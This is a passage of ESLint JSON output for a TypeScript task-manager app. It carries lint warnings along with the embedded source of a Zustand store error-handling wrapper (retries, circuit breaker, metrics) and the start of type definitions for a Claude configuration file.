correct."},{"messageId":"suggestNever","fix":{"range":[4675,4678],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":197,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":197,"endColumn":22,"suggestions":[{"fix":{"range":[6223,6322],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":221,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":221,"endColumn":25,"suggestions":[{"fix":{"range":[7466,7595],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":364,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":364,"endColumn":19,"suggestions":[{"fix":{"range":[12524,12625],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":373,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":373,"endColumn":18,"suggestions":[{"fix":{"range":[12838,12900],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":383,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":383,"endColumn":18,"suggestions":[{"fix":{"range":[13135,13197],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":493,"column":36,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":493,"endColumn":39,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[16613,16616],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[16613,16616],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":502,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":502,"endColumn":19,"suggestions":[{"fix":{"range":[16864,16963],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":724,"column":12,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":724,"endColumn":15,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[22279,22282],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[22279,22282],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":736,"column":31,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":736,"endColumn":34,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[22652,22655],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[22652,22655],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":14,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Store Error Wrapper for Zustand Operations (2025)\n * \n * This wrapper provides comprehensive error handling, retry mechanisms,\n * and recovery functionality for all Zustand store operations.\n * \n * Following 2025 patterns for resilient state management and error boundaries.\n */\n\nimport { useErrorStore, type StoreError } from './errorStore';\nimport { useTaskStore } from './useTaskStore';\nimport type { Task } from '@/types';\n\n// Error severity mapping based on operation type\nconst ERROR_SEVERITY_MAP: Record<string, StoreError['severity']> = {\n  'read': 'low',\n  'filter': 'low',\n  'search': 'low',\n  'add': 'medium',\n  'update': 'medium',\n  'delete': 'high',\n  'bulk': 'high',\n  'import': 'critical',\n  'export': 'medium',\n  'reset': 'critical'\n};\n\n// Retry configuration for different operation types\ninterface RetryConfig {\n  maxAttempts: number;\n  baseDelay: number;\n  backoffMultiplier: number;\n  jitter: boolean;\n  retryableErrors: string[];\n}\n\nconst RETRY_CONFIGS: Record<string, RetryConfig> = {\n  'read': {\n    maxAttempts: 3,\n    baseDelay: 100,\n    backoffMultiplier: 1.5,\n    jitter: true,\n    retryableErrors: ['NETWORK_ERROR', 'TIMEOUT', 'RATE_LIMIT']\n  },\n  'write': {\n    maxAttempts: 5,\n    baseDelay: 500,\n    backoffMultiplier: 2,\n    jitter: true,\n    retryableErrors: ['NETWORK_ERROR', 'TIMEOUT', 'CONFLICT', 'RATE_LIMIT']\n  },\n  'critical': {\n    maxAttempts: 7,\n    baseDelay: 1000,\n    backoffMultiplier: 2,\n    jitter: true,\n    retryableErrors: ['NETWORK_ERROR', 'TIMEOUT', 'CONFLICT', 'RATE_LIMIT', 'TEMPORARY_ERROR']\n  }\n};\n\n// Operation context for error tracking\ninterface OperationContext {\n  operation: string;\n  operationType: 'read' | 'write' | 'critical';\n  startTime: number;\n  attempt: number;\n  maxAttempts: number;\n  lastError?: Error;\n}\n\n// Wrapper function type\ntype StoreOperation<T extends any[], R> = (...args: T) => R;\ntype AsyncStoreOperation<T extends any[], R> = (...args: T) => Promise<R>;\n\n/**\n * Error wrapper for synchronous store operations\n */\nfunction withErrorHandling<T extends any[], R>(\n  operation: StoreOperation<T, R>,\n  operationName: string,\n  operationType: 'read' | 'write' | 'critical' = 'read'\n): StoreOperation<T, R> {\n  return (...args: T): R => {\n    const addError = useErrorStore.getState().addError;\n    const createBackup = useErrorStore.getState().createBackup;\n    const context: OperationContext = {\n      operation: operationName,\n      operationType,\n      startTime: Date.now(),\n      attempt: 1,\n      maxAttempts: 1 // Sync operations don't retry\n    };\n\n    try {\n      // Create backup before write/critical operations\n      if (operationType !== 'read') {\n        const currentState = useTaskStore.getState();\n        createBackup('taskStore', {\n          tasks: currentState.tasks,\n          selectedTask: currentState.selectedTask,\n          filters: currentState.filters,\n          userSettings: currentState.userSettings\n        });\n      }\n\n      const result = operation(...args);\n      \n      // Record operation metrics (2025 pattern)\n      operationMonitor.recordOperation(operationName, true, Date.now() - context.startTime);\n      \n      // Log successful operation in development\n      if (process.env.NODE_ENV === 'development') {\n        const duration = Date.now() - context.startTime;\n        console.log(`âœ… Store operation '${operationName}' completed in ${duration}ms`);\n      }\n      \n      return result;\n    } catch (error) {\n      const errorMessage = error instanceof Error ? error.message : String(error);\n      const stack = error instanceof Error ? error.stack : undefined;\n      \n      // Record operation metrics (2025 pattern)\n      const duration = Date.now() - context.startTime;\n      operationMonitor.recordOperation(operationName, false, duration, error instanceof Error ? error.name : 'UnknownError');\n      \n      // Add error to error store\n      addError({\n        code: 'STORE_OPERATION_ERROR',\n        message: `Store operation '${operationName}' failed: ${errorMessage}`,\n        stack,\n        context: {\n          operation: operationName,\n          operationType,\n          args: args.length > 0 ? args : undefined,\n          duration,\n          attempt: context.attempt\n        },\n        severity: ERROR_SEVERITY_MAP[operationType] || 'medium',\n        retryable: false, // Sync operations are not retryable\n        operation: operationName,\n        store: 'taskStore',\n        recovered: false,\n        reported: false\n      });\n\n      // Re-throw the error for component-level handling\n      throw error;\n    }\n  };\n}\n\n/**\n * Error wrapper for asynchronous store operations with retry\n */\nfunction withAsyncErrorHandling<T extends any[], R>(\n  operation: AsyncStoreOperation<T, R>,\n  operationName: string,\n  operationType: 'read' | 'write' | 'critical' = 'read'\n): AsyncStoreOperation<T, R> {\n  return async (...args: T): Promise<R> => {\n    const { addError, createBackup, markErrorRecovered } = useErrorStore.getState();\n    const retryConfig = RETRY_CONFIGS[operationType];\n    \n    // Handle case where retryConfig might be undefined\n    if (!retryConfig) {\n      throw new Error(`Invalid operation type: ${operationType}`);\n    }\n    const context: OperationContext = {\n      operation: operationName,\n      operationType,\n      startTime: Date.now(),\n      attempt: 0,\n      maxAttempts: retryConfig.maxAttempts\n    };\n\n    const executeWithRetry = async (): Promise<R> => {\n      context.attempt++;\n      \n      try {\n        // Create backup before write/critical operations on first attempt\n        if (operationType !== 'read' && context.attempt === 1) {\n          const currentState = useTaskStore.getState();\n          createBackup('taskStore', {\n            tasks: currentState.tasks,\n            selectedTask: currentState.selectedTask,\n            filters: currentState.filters,\n            userSettings: currentState.userSettings\n          });\n        }\n\n        const result = await operation(...args);\n        \n        // Log successful operation\n        if (process.env.NODE_ENV === 'development') {\n          const duration = Date.now() - context.startTime;\n          const attemptInfo = context.attempt > 1 ? ` (attempt ${context.attempt})` : '';\n          console.log(`âœ… Async store operation '${operationName}' completed in ${duration}ms${attemptInfo}`);\n        }\n        \n        // Mark any previous errors as recovered\n        if (context.attempt > 1 && context.lastError) {\n          markErrorRecovered(`${operationName}_${context.startTime}`);\n        }\n        \n        return result;\n      } catch (error) {\n        context.lastError = error instanceof Error ? error : new Error(String(error));\n        const errorMessage = context.lastError.message;\n        const isRetryableError = retryConfig.retryableErrors.some(retryableError => \n          errorMessage.includes(retryableError) || context.lastError!.name === retryableError\n        );\n        \n        // Check if we should retry\n        if (context.attempt < context.maxAttempts && (isRetryableError || operationType === 'critical')) {\n          // Calculate delay with exponential backoff and jitter\n          const baseDelay = retryConfig.baseDelay * Math.pow(retryConfig.backoffMultiplier, context.attempt - 1);\n          const jitterAmount = retryConfig.jitter ? Math.random() * 0.1 * baseDelay : 0;\n          const delay = baseDelay + jitterAmount;\n          \n          if (process.env.NODE_ENV === 'development') {\n            console.warn(`âš ï¸ Store operation '${operationName}' failed (attempt ${context.attempt}), retrying in ${Math.round(delay)}ms...`);\n          }\n          \n          // Use AbortController for proper cancellation (2025 best practice)\n          const controller = new AbortController();\n          const timeoutId = setTimeout(() => {\n            controller.abort();\n          }, Math.min(delay, 5000)); // Cap at 5 seconds\n          \n          try {\n            await new Promise((resolve, reject) => {\n              const delayTimeout = setTimeout(resolve, delay);\n              controller.signal.addEventListener('abort', () => {\n                clearTimeout(delayTimeout);\n                reject(new Error('Retry delay cancelled'));\n              });\n            });\n          } finally {\n            clearTimeout(timeoutId);\n          }\n          return executeWithRetry();\n        }\n        \n        // Add error to error store (final attempt or non-retryable)\n        addError({\n          code: 'ASYNC_STORE_OPERATION_ERROR',\n          message: `Async store operation '${operationName}' failed after ${context.attempt} attempts: ${errorMessage}`,\n          stack: context.lastError.stack,\n          context: {\n            operation: operationName,\n            operationType,\n            args: args.length > 0 ? args : undefined,\n            duration: Date.now() - context.startTime,\n            totalAttempts: context.attempt,\n            maxAttempts: context.maxAttempts,\n            retryable: isRetryableError\n          },\n          severity: ERROR_SEVERITY_MAP[operationType] || 'medium',\n          retryable: isRetryableError && context.attempt < context.maxAttempts,\n          operation: operationName,\n          store: 'taskStore',\n          recovered: false,\n          reported: false\n        });\n\n        throw context.lastError;\n      }\n    };\n\n    return executeWithRetry();\n  };\n}\n\n/**\n * Enhanced Circuit Breaker implementation for critical operations (2025)\n * \n * Features half-open state management, metrics collection, and advanced\n * failure detection patterns following 2025 resilience best practices.\n */\nclass CircuitBreaker {\n  private failureCount = 0;\n  private lastFailureTime = 0;\n  private state: 'closed' | 'open' | 'half-open' = 'closed';\n  private successCount = 0;\n  private totalAttempts = 0;\n  private metrics = {\n    totalFailures: 0,\n    totalSuccesses: 0,\n    averageResponseTime: 0,\n    lastStateChange: Date.now()\n  };\n  \n  constructor(\n    private readonly threshold = 5,\n    private readonly timeout = 60000, // 1 minute\n    private readonly halfOpenMaxAttempts = 3 // 2025 pattern: limited attempts in half-open state\n  ) {}\n\n  async execute<T>(operation: () => Promise<T>): Promise<T> {\n    const startTime = Date.now();\n    this.totalAttempts++;\n\n    // State management following 2025 patterns\n    if (this.state === 'open') {\n      const timeSinceLastFailure = Date.now() - this.lastFailureTime;\n      if (timeSinceLastFailure < this.timeout) {\n        throw new Error(`Circuit breaker is open. Retry after ${Math.round((this.timeout - timeSinceLastFailure) / 1000)}s`);\n      }\n      // Transition to half-open state\n      this.transitionToHalfOpen();\n    }\n\n    // In half-open state, limit concurrent attempts\n    if (this.state === 'half-open' && this.successCount >= this.halfOpenMaxAttempts) {\n      throw new Error('Circuit breaker in half-open state: max attempts reached');\n    }\n\n    try {\n      const result = await operation();\n      const responseTime = Date.now() - startTime;\n      this.onSuccess(responseTime);\n      return result;\n    } catch (error) {\n      const responseTime = Date.now() - startTime;\n      this.onFailure(responseTime);\n      throw error;\n    }\n  }\n\n  private onSuccess(responseTime: number): void {\n    this.metrics.totalSuccesses++;\n    this.metrics.averageResponseTime = this.updateAverage(this.metrics.averageResponseTime, responseTime, this.metrics.totalSuccesses);\n    \n    if (this.state === 'half-open') {\n      this.successCount++;\n      // After successful attempts in half-open, transition to closed\n      if (this.successCount >= this.halfOpenMaxAttempts) {\n        this.transitionToClosed();\n      }\n    } else if (this.state === 'closed') {\n      this.failureCount = 0; // Reset failure count on success\n    }\n  }\n\n  private onFailure(responseTime: number): void {\n    this.metrics.totalFailures++;\n    this.metrics.averageResponseTime = this.updateAverage(this.metrics.averageResponseTime, responseTime, this.metrics.totalFailures + this.metrics.totalSuccesses);\n    \n    this.failureCount++;\n    this.lastFailureTime = Date.now();\n    \n    if (this.state === 'closed' && this.failureCount >= this.threshold) {\n      this.transitionToOpen();\n    } else if (this.state === 'half-open') {\n      // Any failure in half-open state transitions back to open\n      this.transitionToOpen();\n    }\n  }\n\n  private transitionToOpen(): void {\n    this.state = 'open';\n    this.metrics.lastStateChange = Date.now();\n    if (process.env.NODE_ENV === 'development') {\n      console.warn(`ðŸ”´ Circuit breaker OPEN: ${this.failureCount} failures, threshold: ${this.threshold}`);\n    }\n  }\n\n  private transitionToHalfOpen(): void {\n    this.state = 'half-open';\n    this.successCount = 0;\n    this.metrics.lastStateChange = Date.now();\n    if (process.env.NODE_ENV === 'development') {\n      console.log(`ðŸŸ¡ Circuit breaker HALF-OPEN: testing recovery`);\n    }\n  }\n\n  private transitionToClosed(): void {\n    this.state = 'closed';\n    this.failureCount = 0;\n    this.successCount = 0;\n    this.metrics.lastStateChange = Date.now();\n    if (process.env.NODE_ENV === 'development') {\n      console.log(`ðŸŸ¢ Circuit breaker CLOSED: recovery successful`);\n    }\n  }\n\n  private updateAverage(currentAvg: number, newValue: number, count: number): number {\n    return (currentAvg * (count - 1) + newValue) / count;\n  }\n\n  getState(): { \n    state: 'closed' | 'open' | 'half-open';\n    isOpen: boolean; \n    failureCount: number; \n    lastFailureTime: number;\n    metrics: typeof this.metrics;\n    totalAttempts: number;\n  } {\n    return {\n      state: this.state,\n      isOpen: this.state === 'open',\n      failureCount: this.failureCount,\n      lastFailureTime: this.lastFailureTime,\n      metrics: { ...this.metrics },\n      totalAttempts: this.totalAttempts\n    };\n  }\n\n  reset(): void {\n    this.failureCount = 0;\n    this.state = 'closed';\n    this.lastFailureTime = 0;\n    this.successCount = 0;\n    this.totalAttempts = 0;\n    this.metrics = {\n      totalFailures: 0,\n      totalSuccesses: 0,\n      averageResponseTime: 0,\n      lastStateChange: Date.now()\n    };\n  }\n}\n\n// Enhanced monitoring and bulkhead patterns for operation isolation (2025)\ninterface OperationMetrics {\n  totalOperations: number;\n  successRate: number;\n  averageLatency: number;\n  p95Latency: number;\n  errorsByType: Record<string, number>;\n  lastReset: number;\n}\n\n// Global operation monitoring (2025 pattern)\nconst operationMonitor = {\n  metrics: new Map<string, OperationMetrics>(),\n  latencyHistory: new Map<string, number[]>(),\n  \n  recordOperation(operationName: string, success: boolean, latency: number, errorType?: string) {\n    const existing = this.metrics.get(operationName) || {\n      totalOperations: 0,\n      successRate: 100,\n      averageLatency: 0,\n      p95Latency: 0,\n      errorsByType: {},\n      lastReset: Date.now()\n    };\n    \n    existing.totalOperations++;\n    existing.successRate = ((existing.successRate * (existing.totalOperations - 1)) + (success ? 100 : 0)) / existing.totalOperations;\n    existing.averageLatency = ((existing.averageLatency * (existing.totalOperations - 1)) + latency) / existing.totalOperations;\n    \n    if (!success && errorType) {\n      existing.errorsByType[errorType] = (existing.errorsByType[errorType] || 0) + 1;\n    }\n    \n    // Track latency for P95 calculation\n    const history = this.latencyHistory.get(operationName) || [];\n    history.push(latency);\n    if (history.length > 100) history.shift(); // Keep last 100 measurements\n    this.latencyHistory.set(operationName, history);\n    \n    // Calculate P95\n    const sorted = [...history].sort((a, b) => a - b);\n    existing.p95Latency = sorted[Math.floor(sorted.length * 0.95)] || latency;\n    \n    this.metrics.set(operationName, existing);\n  },\n  \n  getMetrics(): Map<string, OperationMetrics> {\n    return new Map(this.metrics);\n  },\n  \n  resetMetrics(): void {\n    this.metrics.clear();\n    this.latencyHistory.clear();\n  }\n};\n\n// Circuit breakers for different operation types - Optimized timeouts for 2025\nconst circuitBreakers = {\n  critical: new CircuitBreaker(3, 10000), // 3 failures, 10s timeout (reduced from 30s)\n  write: new CircuitBreaker(5, 15000),    // 5 failures, 15s timeout (reduced from 60s)\n  read: new CircuitBreaker(10, 20000)     // 10 failures, 20s timeout (reduced from 120s)\n};\n\n// Circuit breaker wrapper removed - functionality integrated into withAsyncErrorHandling\n// for better performance and reduced complexity in 2025 patterns\n\n/**\n * Safe wrapper that catches all errors and provides fallback values\n */\nfunction withSafeWrapper<T extends any[], R>(\n  operation: StoreOperation<T, R>,\n  operationName: string,\n  fallbackValue: R\n): StoreOperation<T, R> {\n  return (...args: T): R => {\n    try {\n      return withErrorHandling(operation, operationName)(...args);\n    } catch (error) {\n      console.warn(`Safe wrapper: operation '${operationName}' failed, returning fallback value`, error);\n      return fallbackValue;\n    }\n  };\n}\n\n/**\n * Store wrapper that provides error-handling versions of all store operations\n */\nexport const createErrorHandledTaskStore = () => {\n  const store = useTaskStore;\n  \n  return {\n    // Read operations (with safe wrappers and fallbacks)\n    getTasks: withSafeWrapper(\n      () => store.getState().tasks,\n      'getTasks',\n      []\n    ),\n    \n    getFilteredTasks: withSafeWrapper(\n      store.getState().getFilteredTasks,\n      'getFilteredTasks',\n      []\n    ),\n    \n    getTaskById: withSafeWrapper(\n      store.getState().getTaskById,\n      'getTaskById',\n      undefined\n    ),\n    \n    getTasksByStatus: withSafeWrapper(\n      store.getState().getTasksByStatus,\n      'getTasksByStatus',\n      []\n    ),\n    \n    getTasksByPriority: withSafeWrapper(\n      store.getState().getTasksByPriority,\n      'getTasksByPriority',\n      []\n    ),\n    \n    getDependentTasks: withSafeWrapper(\n      store.getState().getDependentTasks,\n      'getDependentTasks',\n      []\n    ),\n    \n    getBlockingTasks: withSafeWrapper(\n      store.getState().getBlockingTasks,\n      'getBlockingTasks',\n      []\n    ),\n    \n    // Write operations (with error handling and retries)\n    setTasks: withErrorHandling(\n      store.getState().setTasks,\n      'setTasks',\n      'write'\n    ),\n    \n    addTask: withErrorHandling(\n      store.getState().addTask,\n      'addTask',\n      'write'\n    ),\n    \n    updateTask: withErrorHandling(\n      store.getState().updateTask,\n      'updateTask',\n      'write'\n    ),\n    \n    deleteTask: withErrorHandling(\n      store.getState().deleteTask,\n      'deleteTask',\n      'write'\n    ),\n    \n    duplicateTask: withErrorHandling(\n      store.getState().duplicateTask,\n      'duplicateTask',\n      'write'\n    ),\n    \n    // Subtask operations\n    addSubtask: withErrorHandling(\n      store.getState().addSubtask,\n      'addSubtask',\n      'write'\n    ),\n    \n    updateSubtask: withErrorHandling(\n      store.getState().updateSubtask,\n      'updateSubtask',\n      'write'\n    ),\n    \n    deleteSubtask: withErrorHandling(\n      store.getState().deleteSubtask,\n      'deleteSubtask',\n      'write'\n    ),\n    \n    // Bulk operations (high-risk)\n    updateMultipleTasks: withErrorHandling(\n      store.getState().updateMultipleTasks,\n      'updateMultipleTasks',\n      'critical'\n    ),\n    \n    deleteMultipleTasks: withErrorHandling(\n      store.getState().deleteMultipleTasks,\n      'deleteMultipleTasks',\n      'critical'\n    ),\n    \n    // Data operations (critical) - Fixed timeout issues by removing unnecessary Promise wrapping\n    loadFromJSON: withAsyncErrorHandling(\n      async (data: { tasks: Task[] }) => {\n        // Use AbortController for proper timeout handling (2025 best practice)\n        const controller = new AbortController();\n        const timeoutId = setTimeout(() => {\n          controller.abort();\n        }, 3000); // Reduced to 3 seconds for faster tests\n        \n        try {\n          await new Promise<void>((resolve, reject) => {\n            controller.signal.addEventListener('abort', () => {\n              reject(new Error('loadFromJSON operation timed out after 3000ms'));\n            });\n            \n            // Execute synchronously but allow cancellation\n            try {\n              store.getState().loadFromJSON(data);\n              resolve();\n            } catch (error) {\n              reject(error);\n            }\n          });\n        } finally {\n          clearTimeout(timeoutId);\n        }\n      },\n      'loadFromJSON',\n      'critical'\n    ),\n    \n    exportToJSON: withSafeWrapper(\n      store.getState().exportToJSON,\n      'exportToJSON',\n      { tasks: [] }\n    ),\n    \n    resetStore: withErrorHandling(\n      store.getState().resetStore,\n      'resetStore',\n      'critical'\n    ),\n    \n    // UI state operations (low-risk)\n    setSelectedTask: withErrorHandling(\n      store.getState().setSelectedTask,\n      'setSelectedTask',\n      'read'\n    ),\n    \n    setFilters: withErrorHandling(\n      store.getState().setFilters,\n      'setFilters',\n      'read'\n    ),\n    \n    clearFilters: withErrorHandling(\n      store.getState().clearFilters,\n      'clearFilters',\n      'read'\n    ),\n    \n    setViewMode: withErrorHandling(\n      store.getState().setViewMode,\n      'setViewMode',\n      'read'\n    ),\n    \n    setUserSettings: withErrorHandling(\n      store.getState().setUserSettings,\n      'setUserSettings',\n      'write'\n    ),\n    \n    setSearchQuery: withErrorHandling(\n      store.getState().setSearchQuery,\n      'setSearchQuery',\n      'read'\n    ),\n    \n    setSidebarCollapsed: withErrorHandling(\n      store.getState().setSidebarCollapsed,\n      'setSidebarCollapsed',\n      'read'\n    ),\n    \n    // Subscribe to store changes\n    subscribe: store.subscribe,\n    \n    // Get current state (safe)\n    getState: withSafeWrapper(\n      store.getState,\n      'getState',\n      store.getInitialState?.() || {\n        tasks: [],\n        selectedTask: null,\n        filters: {},\n        viewMode: { type: 'list', density: 'comfortable', groupBy: 'status', sortBy: 'id', sortOrder: 'asc' },\n        userSettings: { ui: {}, notifications: {}, workingHours: {} },\n        analytics: {},\n        isLoading: false,\n        searchQuery: '',\n        sidebarCollapsed: false\n      } as any\n    ),\n    \n    // Circuit breaker controls\n    resetCircuitBreakers: () => {\n      Object.values(circuitBreakers).forEach(breaker => breaker.reset());\n    },\n    \n    getCircuitBreakerStates: () => {\n      return Object.entries(circuitBreakers).reduce((acc, [key, breaker]) => {\n        acc[key] = breaker.getState();\n        return acc;\n      }, {} as Record<string, any>);\n    }\n  };\n};\n\n// Export the error-handled store instance\nexport const errorHandledTaskStore = createErrorHandledTaskStore();\n\n// Export types and utilities\nexport type ErrorHandledTaskStore = ReturnType<typeof createErrorHandledTaskStore>;\nexport { circuitBreakers, ERROR_SEVERITY_MAP, RETRY_CONFIGS };\n\n// Hook for components to use the error-handled store\nexport const useErrorHandledTaskStore = () => {\n  return errorHandledTaskStore;\n};","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/store/useTaskStore.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/types/claude-config.ts","messages":[{"ruleId":"@typescript-eslint/no-empty-object-type","severity":2,"message":"The `{}` (\"empty object\") type allows any non-nullish value, including literals like `0` and `\"\"`.\n- If that's what you want, disable this lint rule with an inline comment or configure the 'allowObjectTypes' rule option.\n- If you want a type meaning \"any object\", you probably want `object` instead.\n- If you want a type meaning \"any value\", you probably want `unknown` instead.","line":236,"column":21,"nodeType":"TSTypeLiteral","messageId":"noEmptyObject","endLine":236,"endColumn":23,"suggestions":[{"messageId":"replaceEmptyObjectType","data":{"replacement":"object"},"fix":{"range":[7623,7625],"text":"object"},"desc":"Replace `{}` with `object`."},{"messageId":"replaceEmptyObjectType","data":{"replacement":"unknown"},"fix":{"range":[7623,7625],"text":"unknown"},"desc":"Replace `{}` with `unknown`."}]},{"ruleId":"@typescript-eslint/no-empty-object-type","severity":2,"message":"The `{}` (\"empty object\") type allows any non-nullish value, including literals like `0` and `\"\"`.\n- If that's what you want, disable this lint rule with an inline comment or configure the 'allowObjectTypes' rule option.\n- If you want a type meaning \"any object\", you probably want `object` instead.\n- If you want a type meaning \"any value\", you probably want `unknown` instead.","line":240,"column":21,"nodeType":"TSTypeLiteral","messageId":"noEmptyObject","endLine":240,"endColumn":23,"suggestions":[{"messageId":"replaceEmptyObjectType","data":{"replacement":"object"},"fix":{"range":[7723,7725],"text":"object"},"desc":"Replace `{}` with `object`."},{"messageId":"replaceEmptyObjectType","data":{"replacement":"unknown"},"fix":{"range":[7723,7725],"text":"unknown"},"desc":"Replace `{}` with `unknown`."}]}],"suppressedMessages":[],"errorCount":2,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"// Enhanced TypeScript interfaces for Claude JSON configuration structure\n// Following 2025 best practices with branded types, utility types, and strict typing\n\n// Branded types for enhanced type safety\ndeclare const __brand: unique symbol;\ntype Brand<B> = { [__brand]: B };\nexport type Branded<T, B> = T & Brand<B>;\n\n// Domain-specific branded types\nexport type ServerName = Branded<string, 'ServerName'>;\nexport type ProjectPath = Branded<string, 'ProjectPath'>;\nexport type ConfigurationId = Branded<string, 'ConfigurationId'>;\nexport type HealthCheckUrl = Branded<string, 'HealthCheckUrl'>;\nexport type TimestampISO = Branded<string, 'TimestampISO'>;\n\n// Utility types for configuration validation\nexport type NonEmptyArray<T> = [T, ...T[]];\nexport type NonEmptyString = Branded<string, 'NonEmptyString'>;\n\n// Server type enumeration for enhanced type safety\nexport const ServerType = {\n  NPX: 'npx',\n  DOCKER: 'docker', \n  PYTHON: 'python',\n  NODE: 'node',\n  BINARY: 'binary'\n} as const;\n\nexport type ServerTypeValue = typeof ServerType[keyof typeof ServerType];\n\n// Status enumeration for UI state management\nexport const LoadingStatus = {\n  IDLE: 'idle',\n  LOADING: 'loading',\n  SUCCESS: 'success',\n  ERROR: 'error'\n} as const;\n\nexport type LoadingStatusValue = typeof LoadingStatus[keyof typeof LoadingStatus];\n\n// Error handling with discriminated unions\nexport type ConfigError = \n  | { type: 'NETWORK_ERROR'; message: string; statusCode?: number }\n  | { type: 'VALIDATION_ERROR'; message: string; field?: string }\n  | { type: 'FILE_NOT_FOUND'; path: string }\n  | { type: 'PERMISSION_DENIED'; path: string }\n  | { type: 'PARSE_ERROR'; message: string }\n  | { type: 'UNKNOWN_ERROR'; message: string };\n\n// Result type for async operations\nexport type ConfigResult<T> = \n  | { success: true; data: T }\n  | { success: false; error: ConfigError };\n\n// MCP Server configuration with enhanced typing\nexport interface MCPServer {\n  readonly command: NonEmptyString;\n  readonly args: readonly string[];\n  readonly env?: Readonly<Record<string, string>>;\n  readonly type?: ServerTypeValue;\n  readonly healthcheck_url?: HealthCheckUrl;\n  readonly disabled?: boolean;\n  readonly alwaysAllow?: readonly string[];\n}\n\n// Indexed type for server collections\nexport type MCPServers = Readonly<Record<ServerName, MCPServer>>;\n\n// Conversation history with enhanced structure\nexport interface ConversationHistoryItem {\n  readonly display: NonEmptyString;\n  readonly pastedContents: Readonly<Record<string, unknown>>;\n  readonly timestamp?: TimestampISO;\n  readonly id?: ConfigurationId;\n}\n\n// Project configuration with comprehensive typing\nexport interface ProjectConfig {\n  readonly allowedTools?: readonly string[];\n  readonly history?: readonly ConversationHistoryItem[];\n  readonly mcpServers?: MCPServers;\n  readonly hasTrustDialogAccepted?: boolean;\n  readonly dontCrawlDirectory?: boolean;\n  readonly mcpContextUris?: readonly string[];\n  readonly enabledMcpjsonServers?: readonly string[];\n  readonly disabledMcpjsonServers?: readonly string[];\n  readonly enableAllProjectMcpServers?: boolean;\n  readonly ignorePatterns?: readonly string[];\n  readonly projectOnboardingSeenCount?: number;\n  readonly hasClaudeMdExternalIncludesApproved?: boolean;\n  readonly hasClaudeMdExternalIncludesWarningShown?: boolean;\n}\n\n// Tips history with exact key typing\nexport interface TipsHistory {\n  readonly 'shift-enter'?: number;\n  readonly 'terminal-setup'?: number;\n  readonly 'memory-command'?: number;\n  readonly 'theme-command'?: number;\n  readonly 'prompt-queue'?: number;\n  readonly 'todo-list'?: number;\n  readonly 'enter-to-steer-in-relatime'?: number;\n  readonly 'git-worktrees'?: number;\n  readonly 'claude-opus-welcome'?: number;\n  readonly 'vscode-command-install'?: number;\n}\n\n// Main configuration interface with strict typing\nexport interface ClaudeConfig {\n  readonly numStartups: number;\n  readonly tipsHistory: TipsHistory;\n  readonly promptQueueUseCount?: number;\n  readonly mcpServers: MCPServers;\n  readonly projects: Readonly<Record<ProjectPath, ProjectConfig>>;\n  readonly theme?: string;\n  readonly verbose?: boolean;\n}\n\n// Statistics with computed values\nexport interface ClaudeConfigStats {\n  readonly totalProjects: number;\n  readonly totalMcpServers: number;\n  readonly totalConversations: number;\n  readonly lastModified: TimestampISO;\n  readonly fileSize: string;\n  readonly fileSizeBytes: number;\n}\n\n// Component state management with discriminated unions\nexport type ConfigPageState = \n  | { status: 'idle' }\n  | { status: 'loading' }\n  | { status: 'success'; config: ClaudeConfig; stats: ClaudeConfigStats }\n  | { status: 'error'; error: ConfigError };\n\n// Component props with enhanced typing\nexport interface ClaudeConfigPageProps {\n  readonly configPath?: string;\n  readonly onConfigLoad?: (config: ClaudeConfig) => void;\n  readonly onError?: (error: ConfigError) => 